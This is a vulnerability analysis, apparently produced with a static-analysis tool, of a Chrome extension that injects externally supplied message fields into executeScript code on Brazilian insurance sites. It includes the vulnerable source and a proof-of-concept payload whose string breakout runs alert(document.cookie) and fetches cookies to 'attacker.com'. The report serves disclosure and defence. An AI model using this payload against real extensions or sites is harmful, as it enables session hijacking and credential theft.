# CoCo Analysis: bejpbfdphjdnnlfhpgfooeaomnlnodgm

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1 (bg_chrome_runtime_MessageExternal to chrome_tabs_executeScript_sink)

---

## Sink: bg_chrome_runtime_MessageExternal → chrome_tabs_executeScript_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/bejpbfdphjdnnlfhpgfooeaomnlnodgm/opgen_generated_files/bg.js
Line 1003 'document.getElementById("j_username").value = "' + parametros.l + '";'
Line 1004 'document.getElementById("j_password").value = "' + parametros.s + '";'
Line 1030-1062 Multiple parametros fields injected into executeScript

**Code:**

```javascript
// Background script - External message handler (bg.js, line 965-992)
chrome.runtime.onMessageExternal.addListener((message, sender, sendResponse) => {
    if (message == 'version') {
        sendResponse({ type: 'success', version: '0.1.0' });
        return true;
    }

    var codigoSeguradora = message.codigoSeguradora;
    var ramo = message.ramo;
    switch (codigoSeguradora) {
        case 6572:
            switch (ramo) {
                case 31:
                    acessarHDIAuto(message); // <- message passed to function
                    break;
            }
        break;
    }
});

// Function that uses external message data (bg.js, line 995-1010)
var acessarHDIAuto = function (parametros) {
    function efetuarLogin(codigoAba) {
        chrome.tabs.executeScript(codigoAba, {
            code: 'setTimeout(function() { ' +
                'document.getElementById("j_username").value = "' + parametros.l + '";' + // <- attacker-controlled
                'document.getElementById("j_password").value = "' + parametros.s + '";' + // <- attacker-controlled
                'document.querySelector("#fj > div > button").click();' +
                '}, 1500); '
        });
    }

    function preencherCalculo(codigoAba) {
        chrome.tabs.executeScript(codigoAba, {
            code:
                'setTimeout(function() {' +
                'document.getElementById("cpfcgc").value = "' + parametros.CnpjCpf + '";' + // <- attacker-controlled
                'document.getElementById("nomeCliente").value = "' + parametros.Nome + '";' + // <- attacker-controlled
                // ... many more attacker-controlled fields injected into code string
                '}, 1500); '
        });
    }
    // ... functions called later
};
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message via chrome.runtime.onMessageExternal from localhost

**Attack:**

```javascript
// From manifest: "externally_connectable": {"matches": ["*://localhost/*"]}
// An attacker with code running on localhost can inject arbitrary JavaScript

// From a webpage on localhost:
chrome.runtime.sendMessage('bejpbfdphjdnnlfhpgfooeaomnlnodgm', {
    codigoSeguradora: 6572,
    ramo: 31,
    l: '"; alert(document.cookie); //',  // <- Code injection via string concatenation
    s: 'password',
    CnpjCpf: '"; fetch("https://attacker.com/steal?cookie=" + document.cookie); //',
    Nome: 'attacker'
    // ... other fields
});

// The injected code will be executed as:
// 'document.getElementById("j_username").value = ""; alert(document.cookie); //";'
// This breaks out of the string and executes arbitrary JavaScript
```

**Impact:** Arbitrary code execution on targeted insurance company websites (hdi.com.br, tokiomarine.com.br). An attacker controlling localhost (e.g., malicious local application or compromised development server) can inject arbitrary JavaScript that executes in the context of these insurance websites, enabling session hijacking, form manipulation, data exfiltration, and other attacks. The vulnerability exists because external message parameters are directly concatenated into code strings passed to chrome.tabs.executeScript without sanitization.
